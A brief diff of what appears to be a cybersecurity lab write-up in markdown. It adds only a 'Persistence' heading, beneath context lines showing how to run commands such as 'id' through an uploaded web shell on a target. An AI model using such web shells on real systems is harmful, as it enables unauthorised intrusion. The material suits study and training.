@@ -232,3 +232,5 @@ Access the uploaded shell in a browser → http://<Target-IP>/shell.php?cmd=unam
 Access the uploaded shell in a browser → http://<Target-IP>/shell.php?cmd=id → Display user and group IDs
 
 <img src="https://imgur.com/Lx6BVsk.png" alt="CyberSec Lab Diagram" width="600"/>
+
+### Persistence
